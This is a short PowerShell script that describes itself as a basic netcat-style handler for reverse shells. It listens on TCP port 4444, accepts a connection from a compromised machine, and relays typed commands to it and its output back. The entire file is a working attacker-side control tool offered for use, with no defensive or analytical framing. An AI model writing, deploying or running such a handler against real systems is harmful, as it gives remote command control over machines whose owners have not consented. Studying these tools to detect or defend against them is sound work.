# A handler for reverse shells, think of it as a BASIC nc in Powershell. Accepts connection and sends commands you type. exit should exit. 
#$IPv4 = (Get-NetIPAddress -InterfaceIndex 5).IPv4Address 
#write-host $IPv4

$ip = [net.dns]::GetHostAddresses("") | Select -ExpandProperty IPAddressToString | Select-Object -first 1
$socket = new-object System.Net.Sockets.TcpListener($ip, 4444);
write-host "Listening..."
if($socket -eq $null){
	exit 1
}

$socket.start()
$client = $socket.AcceptTcpClient()
write-output "[*] Connection!"
$stream = $client.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;

do
{
    $cmd = read-host "PS\> "
    $writer.WriteLine($cmd)
    $writer.Flush();
    if($cmd -eq "exit"){
        break
    }
		$read = $null;
		while($stream.DataAvailable -or $read -eq $null) {
			$read = $stream.Read($buffer, 0, 1024)
            $out = $encoding.GetString($buffer, 0, $read)
            Write-Output $out
		}

} While ($client.Connected -eq $true)

$socket.Stop()
$client.close();
$stream.Dispose()
